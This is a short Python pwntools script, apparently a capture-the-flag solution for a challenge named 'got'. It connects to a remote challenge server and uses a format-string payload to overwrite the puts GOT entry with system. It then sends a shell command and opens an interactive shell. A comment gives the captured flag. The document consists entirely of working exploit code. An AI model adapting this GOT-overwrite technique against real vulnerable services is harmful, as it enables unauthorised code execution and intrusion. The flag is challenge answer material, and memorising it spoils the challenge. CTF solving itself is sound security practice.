from pwn import *

context.arch = "amd64"

elf = ELF("./vuln")
# io = process("./vuln")
io = remote("got.ictf.kctf.cloud", 1337)
io.sendline(fmtstr_payload(6, {elf.got["puts"]: elf.sym["system"]}))
io.sendline(b"sh 1>&2")
io.interactive()
# ictf{f0rmat_strings_are_so_cool_tysm_rythm_for_introducing_me}
